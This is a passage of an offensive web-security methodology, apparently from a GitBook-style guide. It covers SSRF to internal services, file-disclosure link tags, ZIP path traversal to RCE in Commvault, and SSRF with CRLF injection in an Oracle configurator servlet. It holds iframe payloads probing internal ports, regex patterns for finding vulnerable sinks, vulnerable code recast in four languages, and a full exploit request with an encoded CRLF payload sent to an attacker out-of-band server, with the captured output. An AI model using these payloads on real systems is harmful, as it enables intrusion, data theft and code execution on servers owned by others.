+<iframe src="http://127.0.0.1:22"></iframe>
+<iframe src="http://localhost:6379"></iframe>       <!-- Redis -->
+<iframe src="http://127.0.0.1:9200"></iframe>      <!-- Elasticsearch -->
+<iframe src="http://127.0.0.1:8080"></iframe>      <!-- Jenkins, Tomcat, etc. -->
+```
+{% endstep %}
+
+{% step %}
+For maximum impact – chain with file disclosure
+
+```html
+<link rel="stylesheet" href="file:///etc/passwd">
+<link rel="stylesheet" href="file:///proc/self/environ">
+```
+{% endstep %}
+{% endstepper %}
+
+***
+
+### White Box
+
+#### SSRF to Chaning Path Traversal (ZIP File To RCE)
+
+{% stepper %}
+{% step %}
+Map the entire target system or product using the Burp Suite tool
+{% endstep %}
+
+{% step %}
+Draw all entry points and endpoints in XMind
+{% endstep %}
+
+{% step %}
+Decompile the application based on the programming language used
+{% endstep %}
+
+{% step %}
+Look for the application’s configuration file where paths are defined (for example, `server.xml`)
+
+```xml
+Context path="" docBase="F:/Program Files/Commvault/ContentStore/Apache/webapps/ROOT" reloadable="false">
+          <Manager pathname=""/>
+        </Context>
+        <Context path="/console" docBase="F:/Program Files/Commvault/ContentStore/GUI" reloadable="false">
+          <Manager pathname=""/>
+        </Context>
+        <Context path="/downloads/sqlscripts" docBase="F:/Program Files/Commvault/ContentStore/Metrics/scripts" reloadable="false">
+          <Manager pathname=""/>
+        </Context>
+        <Context path="/publicdownloads/sqlscripts" docBase="F:/Program Files/Commvault/ContentStore/Metrics/public" reloadable="false">
+          <Manager pathname=""/>
+        </Context>
+        <Context path="/commandcenter" docBase="F:/Program Files/Commvault/ContentStore/AdminConsole" reloadable="false">
+          <Manager pathname=""/>
+          <Resource name="BeanManager" auth="Container" type="javax.enterprise.inject.spi.BeanManager" factory="org.jboss.weld.resources.ManagerObjectFactory"/>
+        </Context>
+        <Context path="/identity" docBase="F:/Program Files/Commvault/ContentStore/identity" reloadable="false">
+          <Manager pathname=""/>
+        </Context>
+        <Context path="/CustomReportsEngine" docBase="F:/Program Files/Commvault/ContentStore/CustomReportsEngine" reloadable="false">
+          <Manager pathname=""/>
+        </Context>
+        <Context path="/reports" docBase="F:/Program Files/Commvault/ContentStore/Reports" reloadable="false">
+          <Manager pathname=""/>
+        </Context>
+      </Host> 
+    </Engine>
+```
+{% endstep %}
+
+{% step %}
+In the application structure, find the file that defines or lists the paths that are accessible without authentication.
+{% endstep %}
+
+{% step %}
+In these paths and endpoints, look for names related to processes that deploy a package, such as `deployWebpackage`
+
+```
+legalNotice.do
+ssoLogin.do
+login.do
+feedback.do
+contact.do
+[..Truncated..]
+metricsUpload.do
+webpackage.do
+deployWebpackage.do
+deployServiceCommcell.do
+```
+{% endstep %}
+
+{% step %}
+Review the processing function of this endpoint and check what actions it performs. As shown in the code, the user-controlled input is directly placed into a request inside the code
+
+**VSCode (Regex Detection)**
+
+{% tabs %}
+{% tab title="C#" %}
+```regex
+(HttpClient\s*\.\s*GetAsync)|(WebRequest\.Create)|(Download(File|Data))|(ZipArchive\s*\()|(ExtractToDirectory\s*\()|(FileStream\s*\()|(File\.WriteAll)
+```
+{% endtab %}
+
+{% tab title="Java" %}
+```regex
+(Http(Get|Post)\s*\(\s*".*"\s*\+\s*\w+)|(client\.execute\s*\()|(getEntity\(\)\.getContent\s*\()|(FileOutputStream\s*\()|(unzip(File|.*)\s*\()|(ZipInputStream\s*\()|(new\s+File\s*\(\s*.*\+\s*\w+)
+```
+{% endtab %}
+
+{% tab title="PHP" %}
+```regex
+(file_get_contents\s*\(\s*http)|(curl_exec\s*\()|(ZipArchive\s*\()|(extractTo\s*\()|(fopen\s*\()|(file_put_contents\s*\()
+```
+{% endtab %}
+
+{% tab title="Node.js" %}
+```regex
+(axios\.get\s*\()|(http\.get\s*\()|(https\.get\s*\()|(fs\.writeFile)|(fs\.createWriteStream)|(adm-zip)|(extractAllTo)|(unzipper\.Extract)
+```
+{% endtab %}
+{% endtabs %}
+
+**RipGrep (Regex Detection(Linux))**
+
+{% tabs %}
+{% tab title="C#" %}
+```regex
+HttpClient\s*\.\s*GetAsync|WebRequest\.Create|Download(File|Data)|ZipArchive\s*\(|ExtractToDirectory\s*\(|FileStream\s*\(|File\.WriteAll
+```
+{% endtab %}
+
+{% tab title="Java" %}
+```regex
+Http(Get|Post)\s*\(\s*".*"\s*\+\s*\w+|client\.execute\s*\(|getEntity\(\)\.getContent\s*\(|FileOutputStream\s*\(|unzip(File|.*)\s*\(|ZipInputStream\s*\(|new\s+File\s*\(\s*.*\+\s*\w+
+```
+{% endtab %}
+
+{% tab title="PHP" %}
+```regex
+file_get_contents\s*\(\s*http|curl_exec\s*\(|ZipArchive\s*\(|extractTo\s*\(|fopen\s*\(|file_put_contents\s*\(
+```
+{% endtab %}
+
+{% tab title="Node.js" %}
+```regex
+axios\.get\s*\(|http\.get\s*\(|https\.get\s*\(|fs\.writeFile|fs\.createWriteStream|adm-zip|extractAllTo|unzipper\.Extract
+```
+{% endtab %}
+{% endtabs %}
+
+**Vulnerable Code Pattern**
+
+{% tabs %}
+{% tab title="C#" %}
+```c#
+public void DeployWebPackage(string commcellName, string servicePack, string version)
+{
+    HttpClient client = null;
+
+    try
+    {
+        if (this.cvConfig.GetDisableSSLForCCPackageDeploy())
+        {
+            var handler = new HttpClientHandler
+            {
+                ServerCertificateCustomValidationCallback = (message, cert, chain, errors) => true
+            };
+
+            client = new HttpClient(handler);
+        }
+        else
+        {
+            client = new HttpClient();
+        }
+
+        string BASE_PATH = this.ExtractPath(this.fileZipUtil.GetResourcePath(""), false);
+
+        var request = new HttpRequestMessage(
+            HttpMethod.Get,
+            "https://" + commcellName + "/commandcenter/webpackage.do"
+        ); // <---- [0]
+
+        request.Headers.Add("Accept", "application/octet-stream");
+
+        var response = client.Send(request); // <---- [1]
+    }
+    finally
+    {
+        client?.Dispose();
+    }
+}
+```
+{% endtab %}
+
+{% tab title="Java" %}
+```java
+public void deployWebPackage(String commcellName, String servicePack, String version) throws Exception {
+        CloseableHttpClient client = null;
+
+        try {
+            if (this.cvConfig.getDisableSSLForCCPackageDeploy()) {
+                client = HttpClientBuilder.create().setSSLContext((new SSLContextBuilder()).loadTrustMaterial((KeyStore)null, (x509Certificates, s) -> {
+                    return true;
+                }).build()).setSSLHostnameVerifier(NoopHostnameVerifier.INSTANCE).build();
+            } else {
+                client = HttpClients.createDefault();
+            }
+
+            String BASE_PATH = this.extractPath(this.fileZipUtil.getResourcePath(""), false);
+            HttpGet request = new HttpGet("https://" + commcellName + "/commandcenter/webpackage.do"); <---- [0]
+            request.addHeader("Accept", "application/octet-stream");
+            CloseableHttpResponse response = client.execute(request); <---- [1]
+```
+{% endtab %}
+
+{% tab title="PHP" %}
+```php
+public function deployWebPackage($commcellName, $servicePack, $version)
+{
+    $client = null;
+
+    try {
+        if ($this->cvConfig->getDisableSSLForCCPackageDeploy()) {
+            $client = new \GuzzleHttp\Client([
+                'verify' => false
+            ]);
+        } else {
+            $client = new \GuzzleHttp\Client();
+        }
+
+        $BASE_PATH = $this->extractPath($this->fileZipUtil->getResourcePath(""), false);
+
+        $response = $client->request(
+            'GET',
+            "https://" . $commcellName . "/commandcenter/webpackage.do",
+            [
+                'headers' => [
+                    'Accept' => 'application/octet-stream'
+                ]
+            ]
+        ); // <---- [1]
+    }
+    finally {
+        // Guzzle doesn't require explicit close
+    }
+}
+```
+{% endtab %}
+
+{% tab title="Node.js" %}
+```js
+    async function deployWebPackage(commcellName, servicePack, version) {
+
+    let client;
+
+    if (this.cvConfig.getDisableSSLForCCPackageDeploy()) {
+        const agent = new https.Agent({
+            rejectUnauthorized: false
+        });
+
+        client = axios.create({ httpsAgent: agent });
+    } else {
+        client = axios.create();
+    }
+
+    const BASE_PATH = this.extractPath(this.fileZipUtil.getResourcePath(""), false);
+
+    const response = await client.get(
+        `https://${commcellName}/commandcenter/webpackage.do`,
+        {
+            headers: {
+                'Accept': 'application/octet-stream'
+            }
+        }
+    ); // <---- [1]
+}
+```
+{% endtab %}
+{% endtabs %}
+{% endstep %}
+
+{% step %}
+Check whether multiple file-writing functions are called, such as `FileOutputStream` and `BufferedOutputStream`, for example
+
+{% tabs %}
+{% tab title="C#" %}
+```c#
+try
+{
+    Stream inStream = response.Content.ReadAsStream(); // <---- [2]
+
+    string confPath = BASE_PATH + Path.DirectorySeparatorChar + "Apache" +
+                      Path.DirectorySeparatorChar + "conf" +
+                      Path.DirectorySeparatorChar + "ccPackages" +
+                      Path.DirectorySeparatorChar;
+
+    string distCCPath = BASE_PATH + Path.DirectorySeparatorChar + "AdminConsole" +
+                        Path.DirectorySeparatorChar + "dist-cc-sps" +
+                        Path.DirectorySeparatorChar;
+
+    DirectoryInfo confDirectory = this.CreateDirectory(confPath + servicePack); // <---- [3]
+
+    string absPath = confDirectory.FullName;
+    FileInfo versionFile = new FileInfo(absPath + Path.DirectorySeparatorChar + "version.txt");
+    File.WriteAllText(versionFile.FullName, version, Encoding.UTF8);
+
+    this.CreateDirectory(distCCPath);
+
+    BufferedStream bis = new BufferedStream(inStream); // <---- [4]
+
+    using (FileStream fos = new FileStream(
+        Path.Combine(confDirectory.FullName, "dist-cc.zip"),
+        FileMode.Create)) // <---- [5]
+    {
+        using (BufferedStream bos = new BufferedStream(fos))
+        {
+            byte[] buffer = new byte[1024];
+            int read;
+
+            while ((read = bis.Read(buffer, 0, buffer.Length)) > 0)
+            {
+                bos.Write(buffer, 0, read);
+            }
+        }
+    }
+
+    bis.Close();
+
+    this.DeployCCPackage(servicePack); // <---- [6]
+
+    logger.Info("Deployed web package successfully");
+}
+catch (Exception)
+{
+    throw;
+}
+```
+{% endtab %}
+
+{% tab title="Java" %}
+```java
+try {
+      InputStream in = response.getEntity().getContent();  <---- [2]
+      String confPath = BASE_PATH + File.separator + "Apache" + File.separator + "conf" + File.separator + "ccPackages" + File.separator;
+      String distCCPath = BASE_PATH + File.separator + "AdminConsole" + File.separator + "dist-cc-sps" + File.separator;
+      File confDirectory = this.createDirectory(confPath + servicePack); <---- [3]
+      String var10002 = confDirectory.getAbsolutePath();
+      File versionFile = new File(var10002 + File.separator + "version.txt");
+      FileUtils.writeStringToFile(versionFile, version, StandardCharsets.UTF_8, false);
+      this.createDirectory(distCCPath);
+      BufferedInputStream bis = new BufferedInputStream(in); <---- [4]
+
+      try {
+          FileOutputStream fos = new FileOutputStream(new File(confDirectory, "dist-cc.zip")); <---- [5]
+
+          try {
+              BufferedOutputStream bos = new BufferedOutputStream(fos);
+
+              try {
+                  byte[] buffer = new byte[1024];
+
+                  int read;
+                  while((read = bis.read(buffer)) != -1) {
+                      bos.write(buffer, 0, read);
+[...Truncated...]
+
+      bis.close();
+      this.deployCCPackage(servicePack); <---- [6]
+      logger.info("Deployed web package successfully");
+```
+{% endtab %}
+
+{% tab title="PHP" %}
+```php
+try {
+    $in = $response->getBody(); // <---- [2]
+
+    $confPath = $BASE_PATH . DIRECTORY_SEPARATOR . "Apache" .
+                DIRECTORY_SEPARATOR . "conf" .
+                DIRECTORY_SEPARATOR . "ccPackages" .
+                DIRECTORY_SEPARATOR;
+
+    $distCCPath = $BASE_PATH . DIRECTORY_SEPARATOR . "AdminConsole" .
+                  DIRECTORY_SEPARATOR . "dist-cc-sps" .
+                  DIRECTORY_SEPARATOR;
+
+    $confDirectory = $this->createDirectory($confPath . $servicePack); // <---- [3]
+
+    $absPath = $confDirectory;
+    $versionFile = $absPath . DIRECTORY_SEPARATOR . "version.txt";
+    file_put_contents($versionFile, $version);
+
+    $this->createDirectory($distCCPath);
+
+    $bis = $in; // <---- [4]
+
+    $zipPath = $confDirectory . DIRECTORY_SEPARATOR . "dist-cc.zip"; // <---- [5]
+    $fos = fopen($zipPath, "w");
+
+    while (!feof($bis)) {
+        fwrite($fos, fread($bis, 1024));
+    }
+
+    fclose($fos);
+
+    $this->deployCCPackage($servicePack); // <---- [6]
+
+    $logger->info("Deployed web package successfully");
+
+} catch (Exception $e) {
+    throw $e;
+}
+```
+{% endtab %}
+
+{% tab title="Node.js" %}
+```js
+try {
+    const inStream = response.data; // <---- [2]
+
+    const confPath = BASE_PATH + path.sep + "Apache" +
+                     path.sep + "conf" +
+                     path.sep + "ccPackages" +
+                     path.sep;
+
+    const distCCPath = BASE_PATH + path.sep + "AdminConsole" +
+                       path.sep + "dist-cc-sps" +
+                       path.sep;
+
+    const confDirectory = this.createDirectory(confPath + servicePack); // <---- [3]
+
+    const absPath = confDirectory;
+    const versionFile = path.join(absPath, "version.txt");
+    fs.writeFileSync(versionFile, version);
+
+    this.createDirectory(distCCPath);
+
+    const bis = inStream; // <---- [4]
+
+    const zipPath = path.join(confDirectory, "dist-cc.zip"); // <---- [5]
+    const fos = fs.createWriteStream(zipPath);
+
+    bis.on('data', chunk => {
+        fos.write(chunk);
+    });
+
+    bis.on('end', () => {
+        fos.end();
+        this.deployCCPackage(servicePack); // <---- [6]
+        logger.info("Deployed web package successfully");
+    });
+
+} catch (e) {
+    throw e;
+}
+```
+{% endtab %}
+{% endtabs %}
+{% endstep %}
+
+{% step %}
+After receiving the file and writing it to the specified path, the application downloads a ZIP file from the attacker’s server and extracts it into a temporary path defined by the user. An attacker can place a malicious file inside the ZIP file, which will then be extracted and used in the specified path on the server
+
+{% tabs %}
+{% tab title="C#" %}
+```c#
+private void DeployCCPackage(string servicePack)
+{
+    string BASE_PATH = this.ExtractPath(this.fileZipUtil.GetResourcePath(""), false);
+
+    string CC_DEPLOY_PATH = BASE_PATH + Path.DirectorySeparatorChar + "Apache" +
+                            Path.DirectorySeparatorChar + "conf" +
+                            Path.DirectorySeparatorChar + "ccPackages" +
+                            Path.DirectorySeparatorChar;
+
+    string DIST_CC_PATH = BASE_PATH + Path.DirectorySeparatorChar + "AdminConsole" +
+                          Path.DirectorySeparatorChar + "dist-cc-sps" +
+                          Path.DirectorySeparatorChar;
+
+    string TEMP_DIR = servicePack + ".tmp" + Path.DirectorySeparatorChar + "dist-cc";
+
+    string SERVICEPACK_DEPLOY_PATH = DIST_CC_PATH + servicePack + ".tmp"; // <---- [7]
+
+    DirectoryInfo dir = new DirectoryInfo(SERVICEPACK_DEPLOY_PATH);
+
+    if (dir.Exists)
+    {
+        dir.Delete(true);
+    }
+
+    this.fileZipUtil.UnzipFileWrtAbsPath(
+        CC_DEPLOY_PATH + servicePack + Path.DirectorySeparatorChar + "dist-cc.zip",
+        DIST_CC_PATH + TEMP_DIR
+    ); // <---- [8]
+}
+```
+{% endtab %}
+
+{% tab title="Java" %}
+```java
+private void deployCCPackage(String servicePack) throws IOException {
+    String BASE_PATH = this.extractPath(this.fileZipUtil.getResourcePath(""), false);
+    String CC_DEPLOY_PATH = BASE_PATH + File.separator + "Apache" + File.separator + "conf" + File.separator + "ccPackages" + File.separator;
+    String DIST_CC_PATH = BASE_PATH + File.separator + "AdminConsole" + File.separator + "dist-cc-sps" + File.separator;
+    String TEMP_DIR = servicePack + ".tmp" + File.separator + "dist-cc";
+    String SERVICEPACK_DEPLOY_PATH = DIST_CC_PATH + servicePack + ".tmp"; <---- [7]
+    File dir = new File(SERVICEPACK_DEPLOY_PATH);
+    if (dir.exists()) {
+        FileUtils.deleteDirectory(dir);
+    }
+
+    this.fileZipUtil.unzipFileWrtAbsPath(CC_DEPLOY_PATH + servicePack + File.separator + "dist-cc.zip", DIST_CC_PATH + TEMP_DIR); <---- [8]
+}
+```
+{% endtab %}
+
+{% tab title="PHP" %}
+```php
+private function deployCCPackage($servicePack)
+{
+    $BASE_PATH = $this->extractPath($this->fileZipUtil->getResourcePath(""), false);
+
+    $CC_DEPLOY_PATH = $BASE_PATH . DIRECTORY_SEPARATOR . "Apache" .
+                      DIRECTORY_SEPARATOR . "conf" .
+                      DIRECTORY_SEPARATOR . "ccPackages" .
+                      DIRECTORY_SEPARATOR;
+
+    $DIST_CC_PATH = $BASE_PATH . DIRECTORY_SEPARATOR . "AdminConsole" .
+                    DIRECTORY_SEPARATOR . "dist-cc-sps" .
+                    DIRECTORY_SEPARATOR;
+
+    $TEMP_DIR = $servicePack . ".tmp" . DIRECTORY_SEPARATOR . "dist-cc";
+
+    $SERVICEPACK_DEPLOY_PATH = $DIST_CC_PATH . $servicePack . ".tmp"; // <---- [7]
+
+    if (file_exists($SERVICEPACK_DEPLOY_PATH)) {
+        // Recursive delete
+        exec("rm -rf " . escapeshellarg($SERVICEPACK_DEPLOY_PATH));
+    }
+
+    $this->fileZipUtil->unzipFileWrtAbsPath(
+        $CC_DEPLOY_PATH . $servicePack . DIRECTORY_SEPARATOR . "dist-cc.zip",
+        $DIST_CC_PATH . $TEMP_DIR
+    ); // <---- [8]
+}
+```
+{% endtab %}
+
+{% tab title="Node.js" %}
+```js
+function deployCCPackage(servicePack) {
+
+    const BASE_PATH = this.extractPath(this.fileZipUtil.getResourcePath(""), false);
+
+    const CC_DEPLOY_PATH = BASE_PATH + path.sep + "Apache" +
+                           path.sep + "conf" +
+                           path.sep + "ccPackages" +
+                           path.sep;
+
+    const DIST_CC_PATH = BASE_PATH + path.sep + "AdminConsole" +
+                         path.sep + "dist-cc-sps" +
+                         path.sep;
+
+    const TEMP_DIR = servicePack + ".tmp" + path.sep + "dist-cc";
+
+    const SERVICEPACK_DEPLOY_PATH = DIST_CC_PATH + servicePack + ".tmp"; // <---- [7]
+
+    if (fs.existsSync(SERVICEPACK_DEPLOY_PATH)) {
+        fs.rmSync(SERVICEPACK_DEPLOY_PATH, { recursive: true, force: true });
+    }
+
+    this.fileZipUtil.unzipFileWrtAbsPath(
+        CC_DEPLOY_PATH + servicePack + path.sep + "dist-cc.zip",
+        DIST_CC_PATH + TEMP_DIR
+    ); // <---- [8]
+}
+```
+{% endtab %}
+{% endtabs %}
+{% endstep %}
+{% endstepper %}
+
+***
+
+#### Unauthenticated SSRF with CRLF Injection and Internal XSLT Processing Leading to Remote Code Execution
+
+{% stepper %}
+{% step %}
+Map the entire target system or product using the Burp Suite tool
+{% endstep %}
+
+{% step %}
+Draw the entry points and endpoints in XMind
+{% endstep %}
+
+{% step %}
+Decompile the application based on the programming language used
+{% endstep %}
+
+{% step %}
+Find the application configuration or routing files (such as `web.xml`, `routes.conf`, or their equivalents) and extract the endpoints that are mapped to a handler, servlet, or controller
+
+```xml
+/configurator/UiServlet
+
+<servlet> 
+  <servlet-name>czUiServlet</servlet-name> 
+  <servlet-class>oracle.apps.cz.servlet.UiServlet</servlet-class> 
+  <load-on-startup>1</load-on-startup> 
+</servlet>
+```
+{% endstep %}
+
+{% step %}
+Select endpoints that accept user input and whose parameter names include values related to URL or redirect (such as `target`, `callback`, `return_url`, and so on)
+{% endstep %}
+
+{% step %}
+Open the handler code for that endpoint and check whether the input is passed directly or indirectly into a parser (XML parser, JSON parser, or string parser)
+
+{% tabs %}
+{% tab title="C#" %}
+```csharp
+if (paramHttpServletRequest.getParameter("killAndRestartServer") != null) {
+  paramHttpServletResponse.sendError(400);
+  closeSession(httpSession);
+} 
+else if (paramHttpServletRequest.getParameter("generateOutput") != null) {
+  generateOutput(paramHttpServletRequest, paramHttpServletResponse);
+} 
+else if (paramHttpServletRequest.getParameter("getUiType") != null) {
+
+  string str = paramHttpServletRequest.getParameter("redirectFromJsp"); // [1]
+
+  XMLDocument xMLDocument = XmlUtil.parseXmlString(
+      paramHttpServletRequest.getParameter("getUiType")
+  ); // [0]
+
+  if (str == null || "false".equalsIgnoreCase(str)) {
+    redirectToCZInitialize(paramHttpServletRequest, paramHttpServletResponse, str2);
+    return;
+  } 
+
+  createNew(xMLDocument, httpSession, paramHttpServletRequest, paramHttpServletResponse); // [2]
+}
+
+string str1 = CZUiUtilities.resubXMLAndURLChars(
+    XmlUtil.getReturnUrlParameter(paramXMLDocument)
+);
+
+clientAdapter.setReturnUrl(str1);
+```
+{% endtab %}
+
+{% tab title="Java" %}
+```java
+if (paramHttpServletRequest.getParameter("killAndRestartServer") != null) {
+  paramHttpServletResponse.sendError(400);
+  closeSession(httpSession);
+} 
+else if (paramHttpServletRequest.getParameter("generateOutput") != null) {
+  generateOutput(paramHttpServletRequest, paramHttpServletResponse);
+} 
+else if (paramHttpServletRequest.getParameter("getUiType") != null) {
+
+  String str = paramHttpServletRequest.getParameter("redirectFromJsp"); // [1]
+
+  XMLDocument xMLDocument = XmlUtil.parseXmlString(
+      paramHttpServletRequest.getParameter("getUiType")
+  ); // [0]
+
+  if (str == null || "false".equalsIgnoreCase(str)) {
+    redirectToCZInitialize(paramHttpServletRequest, paramHttpServletResponse, str2);
+    return;
+  } 
+
+  createNew(xMLDocument, httpSession, paramHttpServletRequest, paramHttpServletResponse); // [2]
+}
+
+String str1 = CZUiUtilities.resubXMLAndURLChars(
+    XmlUtil.getReturnUrlParameter(paramXMLDocument)
+);
+
+clientAdapter.setReturnUrl(str1);
+```
+{% endtab %}
+
+{% tab title="PHP" %}
+```php
+if ($paramHttpServletRequest->getParameter("killAndRestartServer") != null) {
+  $paramHttpServletResponse->sendError(400);
+  closeSession($httpSession);
+} 
+else if ($paramHttpServletRequest->getParameter("generateOutput") != null) {
+  generateOutput($paramHttpServletRequest, $paramHttpServletResponse);
+} 
+else if ($paramHttpServletRequest->getParameter("getUiType") != null) {
+
+  $str = $paramHttpServletRequest->getParameter("redirectFromJsp"); // [1]
+
+  $xMLDocument = XmlUtil::parseXmlString(
+      $paramHttpServletRequest->getParameter("getUiType")
+  ); // [0]
+
+  if ($str == null || "false".equalsIgnoreCase($str)) {
+    redirectToCZInitialize($paramHttpServletRequest, $paramHttpServletResponse, $str2);
+    return;
+  } 
+
+  createNew($xMLDocument, $httpSession, $paramHttpServletRequest, $paramHttpServletResponse); // [2]
+}
+
+$str1 = CZUiUtilities::resubXMLAndURLChars(
+    XmlUtil::getReturnUrlParameter($paramXMLDocument)
+);
+
+$clientAdapter->setReturnUrl($str1);
+```
+{% endtab %}
+
+{% tab title="Node.js" %}
+```javascript
+if (paramHttpServletRequest.getParameter("killAndRestartServer") != null) {
+  paramHttpServletResponse.sendError(400);
+  closeSession(httpSession);
+} 
+else if (paramHttpServletRequest.getParameter("generateOutput") != null) {
+  generateOutput(paramHttpServletRequest, paramHttpServletResponse);
+} 
+else if (paramHttpServletRequest.getParameter("getUiType") != null) {
+
+  let str = paramHttpServletRequest.getParameter("redirectFromJsp"); // [1]
+
+  let xMLDocument = XmlUtil.parseXmlString(
+      paramHttpServletRequest.getParameter("getUiType")
+  ); // [0]
+
+  if (str == null || "false".equalsIgnoreCase(str)) {
+    redirectToCZInitialize(paramHttpServletRequest, paramHttpServletResponse, str2);
+    return;
+  } 
+
+  createNew(xMLDocument, httpSession, paramHttpServletRequest, paramHttpServletResponse); // [2]
+}
+
+let str1 = CZUiUtilities.resubXMLAndURLChars(
+    XmlUtil.getReturnUrlParameter(paramXMLDocument)
+);
+
+clientAdapter.setReturnUrl(str1);
+```
+{% endtab %}
+{% endtabs %}
+{% endstep %}
+
+{% step %}
+In the input payload, check whether there is a data structure (such as XML or JSON) from which a specific field is extracted (such as `return_url`)
+{% endstep %}
+
+{% step %}
+Follow the usage path of this extracted value to see to which object it is passed (client, adapter, or service layer)
+
+**VSCode (Regex Detection)**
+
+{% tabs %}
+{% tab title="C#" %}
+```regex
+(XmlDocument\.LoadXml|XDocument\.Parse)|(HttpClient|WebRequest\.Create)|(GetAsync|DownloadString)
+```
+{% endtab %}
+
+{% tab title="Java" %}
+```regex
+(XmlUtil\.parseXmlString)|(getParameter\s*\("getUiType"\))|(new\s+URL\s*\(|HttpURLConnection|CZURLConnection|postXmlMessage)
+```
+{% endtab %}
+
+{% tab title="PHP" %}
+```regex
+(simplexml_load_string)|(DOMDocument)|(curl_exec|file_get_contents\s*\()
+```
+{% endtab %}
+
+{% tab title="Node.js" %}
+```regex
+(xml2js)|(axios\.get|fetch\s*\(|http\.get|https\.get)
+```
+{% endtab %}
+{% endtabs %}
+
+**RipGrep (Regex Detection(Linux))**
+
+{% tabs %}
+{% tab title="C#" %}
+```regex
+XmlDocument\.LoadXml|XDocument\.Parse|HttpClient|WebRequest\.Create|GetAsync|DownloadString
+```
+{% endtab %}
+
+{% tab title="Java" %}
+```regex
+XmlUtil\.parseXmlString|getParameter\s*\("getUiType"\)|new\s+URL\s*\(|HttpURLConnection|CZURLConnection|postXmlMessage
+```
+{% endtab %}
+
+{% tab title="PHP" %}
+```regex
+simplexml_load_string|DOMDocument|curl_exec|file_get_contents\s*\(
+```
+{% endtab %}
+
+{% tab title="Node.js" %}
+```regex
+xml2js|axios\.get|fetch\s*\(|http\.get|https\.get
+```
+{% endtab %}
+{% endtabs %}
+
+**Vulnerable Code Patterns**
+
+{% tabs %}
+{% tab title="C#" %}
+```csharp
+protected void postXmlMessage(String paramString1, String paramString2) throws ServletException {
+  try {
+
+    URL uRL = getUrl(paramString1); // Create URL
+
+    if (uRL != null)
+      paramString1 = uRL.toExternalForm();
+
+    CZURLConnection cZURLConnection = new CZURLConnection(paramString1);
+
+    String[] arrayOfString1 = { "XMLmsg" };
+    String[] arrayOfString2 = { paramString2 };
+
+    cZURLConnection.connect(1, arrayOfString1, arrayOfString2);
+
+    cZURLConnection.close();
+
+  } catch (Exception exception) {
+    throw new ServletException("Could not post XML message...");
+  }
+}
+```
+{% endtab %}
+
+{% tab title="Java" %}
+```java
+protected void postXmlMessage(String paramString1, String paramString2) throws ServletException {
+  try {
+
+    URL uRL = getUrl(paramString1); // Create URL
+
+    if (uRL != null)
+      paramString1 = uRL.toExternalForm();
+
+    CZURLConnection cZURLConnection = new CZURLConnection(paramString1);
+
+    String[] arrayOfString1 = { "XMLmsg" };
+    String[] arrayOfString2 = { paramString2 };
+
+    cZURLConnection.connect(1, arrayOfString1, arrayOfString2);
+
+    cZURLConnection.close();
+
+  } catch (Exception exception) {
+    throw new ServletException("Could not post XML message...");
+  }
+}
+```
+{% endtab %}
+
+{% tab title="PHP" %}
+```php
+protected function postXmlMessage($paramString1, $paramString2)
+{
+  try {
+
+    $uRL = $this->getUrl($paramString1); // Create URL
+
+    if ($uRL != null)
+      $paramString1 = $uRL->toExternalForm();
+
+    $cZURLConnection = new CZURLConnection($paramString1);
+
+    $arrayOfString1 = ["XMLmsg"];
+    $arrayOfString2 = [$paramString2];
+
+    $cZURLConnection->connect(1, $arrayOfString1, $arrayOfString2);
+
+    $cZURLConnection->close();
+
+  } catch (Exception $exception) {
+    throw new ServletException("Could not post XML message...");
+  }
+}
+```
+{% endtab %}
+
+{% tab title="Node.js" %}
+```javascript
+protected postXmlMessage(paramString1, paramString2) throws ServletException {
+  try {
+
+    let uRL = getUrl(paramString1); // Create URL
+
+    if (uRL != null)
+      paramString1 = uRL.toExternalForm();
+
+    let cZURLConnection = new CZURLConnection(paramString1);
+
+    let arrayOfString1 = [ "XMLmsg" ];
+    let arrayOfString2 = [ paramString2 ];
+
+    cZURLConnection.connect(1, arrayOfString1, arrayOfString2);
+
+    cZURLConnection.close();
+
+  } catch (exception) {
+    throw new ServletException("Could not post XML message...");
+  }
+}
+```
+{% endtab %}
+{% endtabs %}
+{% endstep %}
+
+{% step %}
+In the next layer, check whether this value is ultimately used to construct a URL or network connection (such as creating an HTTP request or redirect)
+{% endstep %}
+
+{% step %}
+Look for network sinks that convert user input into an HTTP request (such as `openConnection`, `HttpClient.request`, or `sendRequest`)
+
+{% tabs %}
+{% tab title="C#" %}
+```csharp
+HttpURLConnection httpURLConnection =
+    (HttpURLConnection)paramURL.openConnection();
+
+httpURLConnection.setDoOutput(true);
+httpURLConnection.setRequestMethod("POST");
+
+this.m_connectionOutputStream = httpURLConnection.getOutputStream();
+```
+{% endtab %}
+
+{% tab title="Java" %}
+```java
+HttpURLConnection httpURLConnection =
+    (HttpURLConnection)paramURL.openConnection();
+
+httpURLConnection.setDoOutput(true);
+httpURLConnection.setRequestMethod("POST");
+
+this.m_connectionOutputStream = httpURLConnection.getOutputStream();
+```
+{% endtab %}
+
+{% tab title="PHP" %}
+```php
+$httpURLConnection = (HttpURLConnection)$paramURL->openConnection();
+
+$httpURLConnection->setDoOutput(true);
+$httpURLConnection->setRequestMethod("POST");
+
+$this->m_connectionOutputStream = $httpURLConnection->getOutputStream();
+```
+{% endtab %}
+
+{% tab title="Node.js" %}
+```javascript
+let httpURLConnection =
+    paramURL.openConnection();
+
+httpURLConnection.setDoOutput(true);
+httpURLConnection.setRequestMethod("POST");
+
+this.m_connectionOutputStream = httpURLConnection.getOutputStream();
+```
+{% endtab %}
+{% endtabs %}
+{% endstep %}
+
+{% step %}
+If user input enters the URL or host without restriction, SSRF exists
+{% endstep %}
+
+{% step %}
+Then place a CRLF payload in the target request and send it to your local server to confirm CRLF injection in the SSRF
+
+Request :
+
+```http
+POST /OA_HTML/configurator/UiServlet HTTP/1.1
+Host: {{Hostname}}
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 524
+
+redirectFromJsp=1&getUiType=<@urlencode><?xml version="1.0" encoding="UTF-8"?>
+<initialize>
+    <param name="init_was_saved">test</param>
+    <param name="return_url"><http://attacker-oob-server>&#47;HeaderInjectionTest&#32;HTTP&#47;1&#46;1&#13;&#10;InjectedHeader&#58;Injected&#13;&#10;&#32;&#13;&#10;&#13;&#13;&#10;&#13;&#13;&#10;&#13;&#13;&#10;POST&#32;&#47;</param>
+ 
+    <param name="ui_def_id">0</param>
+    <param name="config_effective_usage_id">0</param>
+    <param name="ui_type">Applet</param>
+</initialize></@urlencode>
+```
+
+Response :
+
+```bash
+[root@oob-server]# python3 server.py 80
+
+[*] Serving raw HTTP on port 80
+
+==================================================
+
+DUMPING RAW HTTP REQUEST from oracle-business-ip:19080
+
+POST /HeaderInjectionTest HTTP/1.1
+--- HEADERS ---
+InjectedHeader: Injected
+```
+{% endstep %}
+
+{% step %}
